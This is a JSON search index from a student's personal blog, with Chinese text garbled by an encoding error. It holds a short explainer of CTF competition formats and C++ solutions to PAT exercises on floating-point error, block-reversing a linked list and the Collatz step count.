{"meta":{"title":"Pa1r0t","subtitle":"è®°å½•æˆé•¿","description":"welcome to my bolg","author":"Pa1r0t_9e","url":"https://pa1r0t.github.io","root":"/"},"pages":[{"title":"å‹æƒ…é“¾æ¥","date":"2022-11-08T07:12:37.000Z","updated":"2023-01-08T12:00:55.893Z","comments":true,"path":"links/index.html","permalink":"https://pa1r0t.github.io/links/index.html","excerpt":"","text":".links-content{ margin-top:1rem; } .link-navigation::after { content: \" \"; display: block; clear: both; } .card { width: 30%; font-size: 1rem; padding: 10px 20px; border-radius: 4px; transition-duration: 0.15s; margin-bottom: 1rem; display:flex; } .card:nth-child(odd) { float: left; } .card:nth-child(even) { float: right; } .card:hover { transform: scale(1.1); box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.12), 0 0 6px 0 rgba(0, 0, 0, 0.04); } .card a { border:none; } .card .ava { width: 3rem!important; height: 3rem!important; margin:0!important; margin-right: 1em!important; border-radius:4px; } .card .card-header { font-style: italic; overflow: hidden; width: 100%; } .card .card-header a { font-style: normal; color: #2bbc8a; font-weight: bold; text-decoration: none; } .card .card-header a:hover { color: #d480aa; text-decoration: none; } .card .card-header .info { font-style:normal; color:#a3a3a3; font-size:14px; min-width: 0; overflow: hidden; white-space: nowrap; } CtfStarâ€™s blog åŠ±å¿—åšå®‰å…¨ç ”ç©¶å‘˜ è¶Šè¡Œå‹¤'s Blog åŠªåŠ›å­¦ä¹ çš„å°èœé¸Ÿ"},{"title":"ctfä»‹ç»","date":"2022-11-08T08:19:16.000Z","updated":"2022-11-08T08:42:09.043Z","comments":true,"path":"ctf/ctf.html","permalink":"https://pa1r0t.github.io/ctf/ctf.html","excerpt":"CTFï¼ˆCapture The Flagï¼‰ä¸­æ–‡ä¸€èˆ¬è¯‘ä½œå¤ºæ——èµ›ï¼Œåœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­æŒ‡çš„æ˜¯ç½‘ç»œå®‰å…¨æŠ€æœ¯äººå‘˜ä¹‹é—´è¿›è¡ŒæŠ€æœ¯ç«æŠ€çš„ä¸€ç§æ¯”èµ›å½¢å¼ã€‚","text":"CTFï¼ˆCapture The Flagï¼‰ä¸­æ–‡ä¸€èˆ¬è¯‘ä½œå¤ºæ——èµ›ï¼Œåœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­æŒ‡çš„æ˜¯ç½‘ç»œå®‰å…¨æŠ€æœ¯äººå‘˜ä¹‹é—´è¿›è¡ŒæŠ€æœ¯ç«æŠ€çš„ä¸€ç§æ¯”èµ›å½¢å¼ã€‚ CTFç«èµ›æ¨¡å¼å…·ä½“åˆ†ä¸ºä»¥ä¸‹ä¸‰ç±»ï¼š ä¸€ã€è§£é¢˜æ¨¡å¼ï¼ˆJeopardyï¼‰ åœ¨è§£é¢˜æ¨¡å¼CTFèµ›åˆ¶ä¸­ï¼Œå‚èµ›é˜Ÿä¼å¯ä»¥é€šè¿‡äº’è”ç½‘æˆ–è€…ç°åœºç½‘ç»œå‚ä¸ï¼Œè¿™ç§æ¨¡å¼çš„CTFç«èµ›ä¸ACMç¼–ç¨‹ç«èµ›ã€ä¿¡æ¯å­¦å¥¥èµ›æ¯”è¾ƒç±»ä¼¼ï¼Œä»¥è§£å†³ç½‘ç»œå®‰å…¨æŠ€æœ¯æŒ‘æˆ˜é¢˜ç›®çš„åˆ†å€¼å’Œæ—¶é—´æ¥æ’åï¼Œé€šå¸¸ç”¨äºåœ¨çº¿é€‰æ‹”èµ›ã€‚é¢˜ç›®ä¸»è¦åŒ…å«é€†å‘ã€æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨ã€Webæ¸—é€ã€å¯†ç ã€å–è¯ã€éšå†™ã€å®‰å…¨ç¼–ç¨‹ç­‰ç±»åˆ«ã€‚ äºŒã€æ”»é˜²æ¨¡å¼ï¼ˆAttack-Defenseï¼‰ åœ¨æ”»é˜²æ¨¡å¼CTFèµ›åˆ¶ä¸­ï¼Œå‚èµ›é˜Ÿä¼åœ¨ç½‘ç»œç©ºé—´äº’ç›¸è¿›è¡Œæ”»å‡»å’Œé˜²å®ˆï¼ŒæŒ–æ˜ç½‘ç»œæœåŠ¡æ¼æ´å¹¶æ”»å‡»å¯¹æ‰‹æœåŠ¡æ¥å¾—åˆ†ï¼Œä¿®è¡¥è‡ªèº«æœåŠ¡æ¼æ´è¿›è¡Œé˜²å¾¡æ¥é¿å…ä¸¢åˆ†ã€‚æ”»é˜²æ¨¡å¼CTFèµ›åˆ¶å¯ä»¥å®æ—¶é€šè¿‡å¾—åˆ†åæ˜ å‡ºæ¯”èµ›æƒ…å†µï¼Œæœ€ç»ˆä¹Ÿä»¥å¾—åˆ†ç›´æ¥åˆ†å‡ºèƒœè´Ÿï¼Œæ˜¯ä¸€ç§ç«äº‰æ¿€çƒˆï¼Œå…·æœ‰å¾ˆå¼ºè§‚èµæ€§å’Œé«˜åº¦é€æ˜æ€§çš„ç½‘ç»œå®‰å…¨èµ›åˆ¶ã€‚åœ¨è¿™ç§èµ›åˆ¶ä¸­ï¼Œä¸ä»…ä»…æ˜¯æ¯”å‚èµ›é˜Ÿå‘˜çš„æ™ºåŠ›å’ŒæŠ€æœ¯ï¼Œä¹Ÿæ¯”ä½“åŠ›ï¼ˆå› ä¸ºæ¯”èµ›ä¸€èˆ¬éƒ½ä¼šæŒç»­48å°æ—¶åŠä»¥ä¸Šï¼‰ï¼ŒåŒæ—¶ä¹Ÿæ¯”å›¢é˜Ÿä¹‹é—´çš„åˆ†å·¥é…åˆä¸åˆä½œã€‚ [1] ä¸‰ã€æ··åˆæ¨¡å¼ï¼ˆMixï¼‰ ç»“åˆäº†è§£é¢˜æ¨¡å¼ä¸æ”»é˜²æ¨¡å¼çš„CTFèµ›åˆ¶ï¼Œæ¯”å¦‚å‚èµ›é˜Ÿä¼é€šè¿‡è§£é¢˜å¯ä»¥è·å–ä¸€äº›åˆå§‹åˆ†æ•°ï¼Œç„¶åé€šè¿‡æ”»é˜²å¯¹æŠ—è¿›è¡Œå¾—åˆ†å¢å‡çš„é›¶å’Œæ¸¸æˆï¼Œæœ€ç»ˆä»¥å¾—åˆ†é«˜ä½åˆ†å‡ºèƒœè´Ÿã€‚é‡‡ç”¨æ··åˆæ¨¡å¼CTFèµ›åˆ¶çš„å…¸å‹ä»£è¡¨å¦‚iCTFå›½é™…CTFç«èµ›ã€‚"},{"title":"about","date":"2022-11-07T03:32:11.000Z","updated":"2023-05-07T11:38:25.964Z","comments":true,"path":"about/index.html","permalink":"https://pa1r0t.github.io/about/index.html","excerpt":"","text":"ä»‹ç»å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯Pa1r0t åœ¨ä¸‹æœ«æµäºŒæœ¬åœ¨è¯»ï¼Œå–œæ¬¢å¹ç‰›ç¡è§‰å‘å‘†"},{"title":"ctf","date":"2022-11-07T10:06:36.000Z","updated":"2022-11-07T10:08:24.873Z","comments":true,"path":"categories/ctf.html","permalink":"https://pa1r0t.github.io/categories/ctf.html","excerpt":"ä»€ä¹ˆæ˜¯CTF?ä¸‹é¢æˆ‘ä»¬å¯¹è¯¾ç¨‹è¿›è¡Œä¸€ä¸ªå†…å®¹çš„è®²è§£ã€‚","text":"ä»€ä¹ˆæ˜¯CTF?ä¸‹é¢æˆ‘ä»¬å¯¹è¯¾ç¨‹è¿›è¡Œä¸€ä¸ªå†…å®¹çš„è®²è§£ã€‚ åœ¨è®²è§£ä¹‹å‰æˆ‘ä»¬é¦–å…ˆæ¥å¯¹ctfè¿›è¡Œå¯¹åº”è®²è§£ï¼Œctfæ˜¯å½“å‰1ç§éå¸¸æµè¡Œçš„ä¿¡æ¯å®‰å…¨ç«èµ›å½¢å¼ï¼Œå…¶è‹±æ–‡åå¯ç¿»è¯‘ä¸ºå¤ºå¾—flagï¼Œä¹Ÿå¯ç¿»è¯‘ä¸ºå¤ºæ——èµ›ã€‚å…¶å¤§ä½“æµç¨‹æ˜¯å‚èµ›å›¢é˜Ÿä¹‹é—´é€šè¿‡æ”»é˜²å¯¹æŠ—ç¨‹åºåˆ†æç­‰å½¢å¼ï¼Œé¦–å…ˆä»ä¸»åŠæ–¹ç»™å‡ºçš„æ¯”èµ›ç¯å¢ƒä¸­è·å¾—ä¸€ä¸²å…·æœ‰ä¸€å®šæ ¼å¼çš„å­—ç¬¦ä¸²æˆ–å…¶ä»–å†…å®¹ï¼Œå¹¶å°†å…¶æäº¤ç»™ä¸»åŠæ–¹ï¼Œä»è€Œå¾—çš„å¯¹åº”åˆ†æ•°ï¼Œä¸ºäº†æ–¹ä¾¿ç§°å‘¼ï¼Œæˆ‘ä»¬æŠŠè¿™æ ·çš„å†…å®¹ç§°ä¹‹ä¸ºflagï¼Œå½“ç„¶åœ¨ctfæ¯”èµ›å½“ä¸­æ¶‰åŠå†…å®¹éå¸¸ç¹æ‚ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ï¼Œæ‰€æœ‰å¯ä»¥åˆ©ç”¨çš„æ–¹ï¼Œæ³•è·å¾—å¯¹åº”çš„flagï¼Œä»¥ä¸Šå°±æ˜¯å’±ä»¬ctfè¿™æ ·ä¸€ä¸ªæ¯”èµ›å½¢å¼ã€‚"},{"title":"æ ‡ç­¾","date":"2022-11-06T05:26:24.000Z","updated":"2022-11-07T02:00:45.230Z","comments":true,"path":"tags/index.html","permalink":"https://pa1r0t.github.io/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-11-06T05:27:18.000Z","updated":"2022-11-07T03:30:48.209Z","comments":true,"path":"categories/index.html","permalink":"https://pa1r0t.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"å…³äºc++ä¸­doubleè¯¯å·®é—®é¢˜","slug":"å…³äºc-ä¸­doubleè¯¯å·®é—®é¢˜","date":"2023-05-10T02:46:59.000Z","updated":"2023-05-10T06:44:07.475Z","comments":true,"path":"2023/05/10/å…³äºc-ä¸­doubleè¯¯å·®é—®é¢˜/","link":"","permalink":"https://pa1r0t.github.io/2023/05/10/%E5%85%B3%E4%BA%8Ec-%E4%B8%ADdouble%E8%AF%AF%E5%B7%AE%E9%97%AE%E9%A2%98/","excerpt":"question: double","text":"question: double PATç”²çº§é¢˜ç»™å®šä¸€ä¸ªæ­£æ•°æ•°åˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä»ä¸­æˆªå–ä»»æ„çš„è¿ç»­çš„å‡ ä¸ªæ•°ï¼Œç§°ä¸ºç‰‡æ®µã€‚ä¾‹å¦‚ï¼Œç»™å®šæ•°åˆ— { 0.1, 0.2, 0.3, 0.4 }ï¼Œæˆ‘ä»¬æœ‰ (0.1) (0.1, 0.2) (0.1, 0.2, 0.3) (0.1, 0.2, 0.3, 0.4) (0.2) (0.2, 0.3) (0.2, 0.3, 0.4) (0.3) (0.3, 0.4) (0.4) è¿™ 10 ä¸ªç‰‡æ®µã€‚ ç»™å®šæ­£æ•´æ•°æ•°åˆ—ï¼Œæ±‚å‡ºå…¨éƒ¨ç‰‡æ®µåŒ…å«çš„æ‰€æœ‰çš„æ•°ä¹‹å’Œã€‚å¦‚æœ¬ä¾‹ä¸­ 10 ä¸ªç‰‡æ®µæ€»å’Œæ˜¯ 0.1 + 0.3 + 0.6 + 1.0 + 0.2 + 0.5 + 0.9 + 0.3 + 0.7 + 0.4 &#x3D; 5.0ã€‚ è¾“å…¥æ ¼å¼ï¼šè¾“å…¥ç¬¬ä¸€è¡Œç»™å‡ºä¸€ä¸ªä¸è¶…è¿‡ 105 çš„æ­£æ•´æ•° Nï¼Œè¡¨ç¤ºæ•°åˆ—ä¸­æ•°çš„ä¸ªæ•°ï¼Œç¬¬äºŒè¡Œç»™å‡º N ä¸ªä¸è¶…è¿‡ 1.0 çš„æ­£æ•°ï¼Œæ˜¯æ•°åˆ—ä¸­çš„æ•°ï¼Œå…¶é—´ä»¥ä¸€ä¸ªç©ºæ ¼åˆ†éš”ã€‚ è¾“å‡ºæ ¼å¼ï¼šåœ¨ä¸€è¡Œä¸­è¾“å‡ºè¯¥åºåˆ—æ‰€æœ‰ç‰‡æ®µåŒ…å«çš„æ•°ä¹‹å’Œï¼Œ è¾“å…¥æ ·ä¾‹ï¼š1240.1 0.2 0.3 0.4 è¾“å‡ºæ ·ä¾‹ï¼š15.00 å…³äºè¿™é¢˜çš„åˆ†æï¼šæˆ‘æ˜¯çœ‹äº†æŸ³ç¥çš„ï¼Œæˆ‘å¤©çœŸåœ°ä»¥ä¸ºä¸€ä¸ªæ•°æ®å‡ºç°äº†n-1è¯ï¼Œä½†æ¯”å¦‚0.2åœ¨0.1çš„æ¡ä»¶ä¸‹ï¼Œå°±å·²ç»å‡ºç°äº†3æ¬¡äº† æŸ³ç¥åŸè¯ï¼šå°†æ•°åˆ—ä¸­çš„æ¯ä¸ªæ•°å­—è¯»å–åˆ°tempä¸­ï¼Œå‡è®¾æˆ‘ä»¬é€‰å–çš„ç‰‡æ®µä¸­åŒ…æ‹¬tempï¼Œä¸”è¿™ä¸ªç‰‡æ®µçš„é¦–å°¾æŒ‡é’ˆåˆ†åˆ«ä¸ºpå’Œqï¼Œé‚£ä¹ˆå¯¹äºpï¼Œæœ‰iç§é€‰æ‹©ï¼Œå³12â€¦iï¼Œå¯¹äºqï¼Œæœ‰n-i+1ç§é€‰æ‹©ï¼Œå³i, i+1, â€¦ nï¼Œæ‰€ä»¥på’Œqç»„åˆå½¢æˆçš„é¦–å°¾ç‰‡æ®µæœ‰i * (n-i+1)ç§ï¼Œå› ä¸ºæ¯ä¸ªé‡Œé¢éƒ½ä¼šå‡ºç°tempï¼Œæ‰€ä»¥tempå¼•èµ·çš„æ€»å’Œä¸ºtemp * i * (n â€“ i + 1)ï¼›éå†å®Œæ‰€æœ‰æ•°å­—ï¼Œå°†æ¯ä¸ªtempå¼•èµ·çš„æ€»å’Œéƒ½ç´¯åŠ åˆ°sumä¸­ï¼Œæœ€åè¾“å‡ºsumçš„å€¼ åŸå…ˆçš„ä»£ç ï¼š 12345678910111213#include&lt;iostream&gt;using namespace std;int main(void)&#123; int n; double tmp,sum = 0; cin &gt;&gt; n; for(int i=0;i&lt;n;i++)&#123; cin &gt;&gt; tmp; sum += tmp * (i + 1) * (n - i); &#125; printf(&quot;%.2f&quot;,sum); return 0;&#125; ç»“æœä¸å¤ªè¡Œå•Š è¿™é‡Œç”¨doubleè¿›è¡Œè¿ç®—æ—¶æ˜¯ä¼šäº§ç”Ÿè¯¯å·®çš„ï¼Œå› ä¸ºæœ‰äº›æ•°ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºä¸å‡ºæ¥ï¼Œc++ä¸­åªèƒ½ç²—ç•¥è¡¨ç¤º. å…·ä½“å‚è€ƒæ–‡ç« ï¼šç”±ä¸€é“ OJ å¼•å‘çš„å…³äº double ç±»å‹çš„ä¸€äº›æ€è€ƒ | Lust for Life (bipy.me) ç„¶åå¤§ä½¬ç»™å‡ºçš„æ–¹æ¡ˆæ˜¯ç”¨long long ç±»å‹è¿›è¡Œå°æ•°ç‚¹åç§»Ã—1000ï¼Œè¿™é‡Œå…¶å®å°±è¦è€ƒè™‘æ‰€ç»™çš„æ•°æ®æ˜¯å¦éƒ½æ˜¯æœ€å¤šå°æ•°ç‚¹åä¸‰ä½äº† 1234567891011121314#include&lt;iostream&gt;using namespace std;int main(void)&#123; int n; long long sum = 0; double tmp; cin &gt;&gt; n; for(int i=0;i&lt;n;i++)&#123; cin &gt;&gt; tmp; sum += (long long)(tmp * 1000) * (i + 1) * (n - i); &#125; printf(&quot;%.2f&quot;,sum/1000.0); return 0;&#125; ç„¶åè¿™é‡Œå±…ç„¶æ‰4.99 æ›´ç¦»è°±çš„æ˜¯ç»™é€šè¿‡äº†ğŸ˜‚ç¬‘æ­»ï¼Œåæ­£æˆ‘æ„Ÿè§‰å¾ˆä¸é è°± å…¶å®æˆ‘è§‰å¾—è¿™é¢˜ç”¨javaä¸­çš„bigdecimalæ‰æ˜¯æœ€ä¼˜ åŠ¨æ€è§„åˆ’ç±»è§£æ³•ï¼š(ä»åå¾€å‰éå†) 12345678910111213141516int n; double tmp; long long sum = 0; cin &gt;&gt; n; long long seq[n]; for(int i=0;i&lt;n;i++) &#123; cin &gt;&gt; tmp; seq[i] = (long long)(tmp * 1000); &#125; sum = seq[n-1]; for(int i=n - 2;i !=-1 ;i--)&#123; seq[i] = seq[i] * (n - i ) + seq[i+1]; sum += seq[i]; &#125; printf(&quot;%.2f&quot;,sum/1000.0); return 0;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"å¥‡å¥‡æ€ªæ€ªçš„é”™è¯¯","slug":"å¥‡å¥‡æ€ªæ€ªçš„é”™è¯¯","date":"2023-05-09T02:30:44.000Z","updated":"2023-05-09T02:54:50.858Z","comments":true,"path":"2023/05/09/å¥‡å¥‡æ€ªæ€ªçš„é”™è¯¯/","link":"","permalink":"https://pa1r0t.github.io/2023/05/09/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%94%99%E8%AF%AF/","excerpt":"PATä¹™çº§ç¬¬äºŒå¤©è®°å½•â€”â€”åè½¬é“¾è¡¨ï¼ˆçº¯æ•°ç»„è§£ï¼‰","text":"PATä¹™çº§ç¬¬äºŒå¤©è®°å½•â€”â€”åè½¬é“¾è¡¨ï¼ˆçº¯æ•°ç»„è§£ï¼‰ ç¬¬ä¸€é¢˜ç»™å®šä¸€ä¸ªå¸¸æ•° K ä»¥åŠä¸€ä¸ªå•é“¾è¡¨ Lï¼Œè¯·ç¼–å†™ç¨‹åºå°† L ä¸­æ¯ K ä¸ªç»“ç‚¹åè½¬ã€‚ä¾‹å¦‚ï¼šç»™å®š L ä¸º 1â†’2â†’3â†’4â†’5â†’6ï¼ŒK ä¸º 3ï¼Œåˆ™è¾“å‡ºåº”è¯¥ä¸º 3â†’2â†’1â†’6â†’5â†’4ï¼›å¦‚æœ K ä¸º 4ï¼Œåˆ™è¾“å‡ºåº”è¯¥ä¸º 4â†’3â†’2â†’1â†’5â†’6ï¼Œå³æœ€åä¸åˆ° K ä¸ªå…ƒç´ ä¸åè½¬ã€‚ è¾“å…¥æ ¼å¼ï¼šæ¯ä¸ªè¾“å…¥åŒ…å« 1 ä¸ªæµ‹è¯•ç”¨ä¾‹ã€‚æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹ç¬¬ 1 è¡Œç»™å‡ºç¬¬ 1 ä¸ªç»“ç‚¹çš„åœ°å€ã€ç»“ç‚¹æ€»ä¸ªæ•°æ­£æ•´æ•° N (â‰¤105)ã€ä»¥åŠæ­£æ•´æ•° K (â‰¤N)ï¼Œå³è¦æ±‚åè½¬çš„å­é“¾ç»“ç‚¹çš„ä¸ªæ•°ã€‚ç»“ç‚¹çš„åœ°å€æ˜¯ 5 ä½éè´Ÿæ•´æ•°ï¼ŒNULL åœ°å€ç”¨ âˆ’1 è¡¨ç¤ºã€‚ æ¥ä¸‹æ¥æœ‰ N è¡Œï¼Œæ¯è¡Œæ ¼å¼ä¸ºï¼š 1Address Data Next å…¶ä¸­ Address æ˜¯ç»“ç‚¹åœ°å€ï¼ŒData æ˜¯è¯¥ç»“ç‚¹ä¿å­˜çš„æ•´æ•°æ•°æ®ï¼ŒNext æ˜¯ä¸‹ä¸€ç»“ç‚¹çš„åœ°å€ã€‚ è¾“å‡ºæ ¼å¼ï¼šå¯¹æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œé¡ºåºè¾“å‡ºåè½¬åçš„é“¾è¡¨ï¼Œå…¶ä¸Šæ¯ä¸ªç»“ç‚¹å ä¸€è¡Œï¼Œæ ¼å¼ä¸è¾“å…¥ç›¸åŒã€‚ è¾“å…¥æ ·ä¾‹ï¼š123456700100 6 400000 4 9999900100 1 1230968237 6 -133218 3 0000099999 5 6823712309 2 33218 è¾“å‡ºæ ·ä¾‹ï¼š12345600000 4 3321833218 3 1230912309 2 0010000100 1 9999999999 5 6823768237 6 -1 å¥‡å¥‡æ€ªæ€ªçš„é”™è¯¯ åé¢å‘ç°æ˜¯æˆ‘mainå‡½æ•°return 1 æœäº†ç½‘å‹çš„å›ç­”ï¼šshellè¿”å›å€¼é0æ˜¯ç¨‹åºé€€å‡ºå¼‚å¸¸ï¼Œè¯´æ˜ä½ çš„ä»£ç æŠ›å‡ºäº†å¼‚å¸¸ã€‚ sogaï¼ï¼ï¼ åŸæœ¬æˆ‘çš„ä»£ç ï¼š 123456789101112131415161718192021222324252627#include&lt;iostream&gt;#include&lt;algorithm&gt; using namespace std;int main(void)&#123; int first,N,K,tmp; int next[100000],data[100000],list[100000]; cin &gt;&gt; first &gt;&gt; N &gt;&gt; K; for(int i=0;i&lt;N;i++)&#123; cin &gt;&gt; tmp; cin &gt;&gt; data[tmp] &gt;&gt; next[tmp]; &#125; int sum = 0; // ä¸æ˜¯æ‰€æœ‰èŠ‚ç‚¹éƒ½åœ¨é“¾ä¸Š //ç”¨listæ•°ç»„æ„é€ é“¾è¡¨ for(int i=0;first != -1;i++)&#123; list[sum++] = first; first = next[first]; &#125; //åè½¬é“¾è¡¨ for(int i=0;i&lt;sum-i*K;i+=K)&#123; reverse(begin(list)+i,begin(list)+i+K); &#125; for(int i=0;i&lt;sum-1;i++)&#123; printf(&quot;%05d %d %05d\\n&quot;,list[i],data[list[i]],list[i+1]); &#125; printf(&quot;%05d %d -1&quot;,list[sum-1],data[list[sum-1]]); return 0;&#125; ä¿®æ”¹åï¼š 123456789101112131415161718192021222324252627#include&lt;iostream&gt;#include&lt;algorithm&gt; using namespace std;int main(void)&#123; int first,N,K,tmp; int next[100000],data[100000],list[100000]; cin &gt;&gt; first &gt;&gt; N &gt;&gt; K; for(int i=0;i&lt;N;i++)&#123; cin &gt;&gt; tmp; cin &gt;&gt; data[tmp] &gt;&gt; next[tmp]; &#125; int sum = 0; // ä¸æ˜¯æ‰€æœ‰èŠ‚ç‚¹éƒ½åœ¨é“¾ä¸Š //ç”¨listæ•°ç»„æ„é€ é“¾è¡¨ for(int i=0;first != -1;i++)&#123; list[sum++] = first; first = next[first]; &#125; //åè½¬é“¾è¡¨ for(int i=0;i&lt;=sum - sum % K;i+=K)&#123; reverse(begin(list)+i,begin(list)+i+K); &#125; for(int i=0;i&lt;sum-1;i++)&#123; printf(&quot;%05d %d %05d\\n&quot;,list[i],data[list[i]],list[i+1]); &#125; printf(&quot;%05d %d -1&quot;,list[sum-1],data[list[sum-1]]); return 1;&#125;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"patä¹™çº§ç¬¬äºŒå¤©è®°å½•","slug":"patä¹™çº§ç¬¬äºŒå¤©è®°å½•","date":"2023-05-08T05:31:53.000Z","updated":"2023-05-08T06:10:27.068Z","comments":true,"path":"2023/05/08/patä¹™çº§ç¬¬äºŒå¤©è®°å½•/","link":"","permalink":"https://pa1r0t.github.io/2023/05/08/pat%E4%B9%99%E7%BA%A7%E7%AC%AC%E4%BA%8C%E5%A4%A9%E8%AE%B0%E5%BD%95/","excerpt":"è®°å½•ä¸€äº›å†™ä»£ç ä¸Šçš„å°ç»†èŠ‚","text":"è®°å½•ä¸€äº›å†™ä»£ç ä¸Šçš„å°ç»†èŠ‚ é¢˜ç›®ä¸€è¯»å…¥ nï¼ˆ&gt;0ï¼‰åå­¦ç”Ÿçš„å§“åã€å­¦å·ã€æˆç»©ï¼Œåˆ†åˆ«è¾“å‡ºæˆç»©æœ€é«˜å’Œæˆç»©æœ€ä½å­¦ç”Ÿçš„å§“åå’Œå­¦å·ã€‚ è¾“å…¥æ ¼å¼ï¼šæ¯ä¸ªæµ‹è¯•è¾“å…¥åŒ…å« 1 ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œæ ¼å¼ä¸º 12345ç¬¬ 1 è¡Œï¼šæ­£æ•´æ•° nç¬¬ 2 è¡Œï¼šç¬¬ 1 ä¸ªå­¦ç”Ÿçš„å§“å å­¦å· æˆç»©ç¬¬ 3 è¡Œï¼šç¬¬ 2 ä¸ªå­¦ç”Ÿçš„å§“å å­¦å· æˆç»© ... ... ...ç¬¬ n+1 è¡Œï¼šç¬¬ n ä¸ªå­¦ç”Ÿçš„å§“å å­¦å· æˆç»© å…¶ä¸­å§“åå’Œå­¦å·å‡ä¸ºä¸è¶…è¿‡ 10 ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œæˆç»©ä¸º 0 åˆ° 100 ä¹‹é—´çš„ä¸€ä¸ªæ•´æ•°ï¼Œè¿™é‡Œä¿è¯åœ¨ä¸€ç»„æµ‹è¯•ç”¨ä¾‹ä¸­æ²¡æœ‰ä¸¤ä¸ªå­¦ç”Ÿçš„æˆç»©æ˜¯ç›¸åŒçš„ã€‚ è¾“å‡ºæ ¼å¼ï¼šå¯¹æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹è¾“å‡º 2 è¡Œï¼Œç¬¬ 1 è¡Œæ˜¯æˆç»©æœ€é«˜å­¦ç”Ÿçš„å§“åå’Œå­¦å·ï¼Œç¬¬ 2 è¡Œæ˜¯æˆç»©æœ€ä½å­¦ç”Ÿçš„å§“åå’Œå­¦å·ï¼Œå­—ç¬¦ä¸²é—´æœ‰ 1 ç©ºæ ¼ã€‚ è¾“å…¥æ ·ä¾‹ï¼š12343Joe Math990112 89Mike CS991301 100Mary EE990830 95 è¾“å‡ºæ ·ä¾‹ï¼š12Mike CS991301Joe Math990112 è¿™ä¸€é¢˜æˆ‘å…¶å®æƒ³å°†å­¦ç”Ÿä¿¡æ¯ç”¨ä¸‰ä¸ªå­—ç¬¦ä¸²æ¥åŒæ—¶å­˜å„ç§ä¿¡æ¯ï¼Œå¥ˆä½•c++åˆ‡å‰²å­—ç¬¦ä¸²æ–¹é¢å¹¶æ²¡æœ‰pythonæ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿè€è€å®å®ç©ºé—´æ¢æ—¶é—´äº†ï¼Œä¸è¿‡ç¨‹åºé€»è¾‘è¿˜çœŸç®—æ˜¯ç®€å•äº† 123456789101112131415#include&lt;iostream&gt;using namespace std;int main(void)&#123; int n,max_s = -1,min_s = 101,score; string max_name,min_name,max_num,min_num,tmp_name,tmp_num; cin &gt;&gt; n; for(int i=0;i&lt;n;i++)&#123; cin &gt;&gt; tmp_name &gt;&gt; tmp_num &gt;&gt; score; if(score &gt; max_s)&#123; max_s = score; max_name = tmp_name; max_num = tmp_num;&#125; if(score &lt; min_s)&#123; min_s = score; min_name = tmp_name; min_num = tmp_num;&#125; &#125; cout &lt;&lt; max_name &lt;&lt; &quot; &quot; &lt;&lt; max_num &lt;&lt; endl; cout &lt;&lt; min_name &lt;&lt; &quot; &quot; &lt;&lt; min_num; &#125; é¢˜ç›®äºŒå¡æ‹‰å…¹(Callatz)çŒœæƒ³ï¼š å¯¹ä»»ä½•ä¸€ä¸ªæ­£æ•´æ•° nï¼Œå¦‚æœå®ƒæ˜¯å¶æ•°ï¼Œé‚£ä¹ˆæŠŠå®ƒç æ‰ä¸€åŠï¼›å¦‚æœå®ƒæ˜¯å¥‡æ•°ï¼Œé‚£ä¹ˆæŠŠ (3n+1) ç æ‰ä¸€åŠã€‚è¿™æ ·ä¸€ç›´åå¤ç ä¸‹å»ï¼Œæœ€åä¸€å®šåœ¨æŸä¸€æ­¥å¾—åˆ° n&#x3D;1ã€‚å¡æ‹‰å…¹åœ¨ 1950 å¹´çš„ä¸–ç•Œæ•°å­¦å®¶å¤§ä¼šä¸Šå…¬å¸ƒäº†è¿™ä¸ªçŒœæƒ³ï¼Œä¼ è¯´å½“æ—¶è€¶é²å¤§å­¦å¸ˆç”Ÿé½åŠ¨å‘˜ï¼Œæ‹¼å‘½æƒ³è¯æ˜è¿™ä¸ªè²Œä¼¼å¾ˆå‚»å¾ˆå¤©çœŸçš„å‘½é¢˜ï¼Œç»“æœé—¹å¾—å­¦ç”Ÿä»¬æ— å¿ƒå­¦ä¸šï¼Œä¸€å¿ƒåªè¯ (3n+1)ï¼Œä»¥è‡³äºæœ‰äººè¯´è¿™æ˜¯ä¸€ä¸ªé˜´è°‹ï¼Œå¡æ‹‰å…¹æ˜¯åœ¨è“„æ„å»¶ç¼“ç¾å›½æ•°å­¦ç•Œæ•™å­¦ä¸ç§‘ç ”çš„è¿›å±•â€¦â€¦ æˆ‘ä»¬ä»Šå¤©çš„é¢˜ç›®ä¸æ˜¯è¯æ˜å¡æ‹‰å…¹çŒœæƒ³ï¼Œè€Œæ˜¯å¯¹ç»™å®šçš„ä»»ä¸€ä¸è¶…è¿‡ 1000 çš„æ­£æ•´æ•° nï¼Œç®€å•åœ°æ•°ä¸€ä¸‹ï¼Œéœ€è¦å¤šå°‘æ­¥ï¼ˆç å‡ ä¸‹ï¼‰æ‰èƒ½å¾—åˆ° n&#x3D;1ï¼Ÿ è¾“å…¥æ ¼å¼ï¼šæ¯ä¸ªæµ‹è¯•è¾“å…¥åŒ…å« 1 ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œå³ç»™å‡ºæ­£æ•´æ•° n çš„å€¼ã€‚ è¾“å‡ºæ ¼å¼ï¼šè¾“å‡ºä» n è®¡ç®—åˆ° 1 éœ€è¦çš„æ­¥æ•°ã€‚ è¾“å…¥æ ·ä¾‹ï¼š13 è¾“å‡ºæ ·ä¾‹ï¼š15 æˆ‘åŸæœ¬æ˜¯è¿™æ ·å†™çš„ï¼š 123456789101112#include&lt;iostream&gt;using namespace std;int main()&#123; int n,i = 0; cin &gt;&gt; n; for(;n != 1;i++)&#123; if(n%2) n = (3*n + 1)/2; else n /= 2; &#125; cout &lt;&lt; 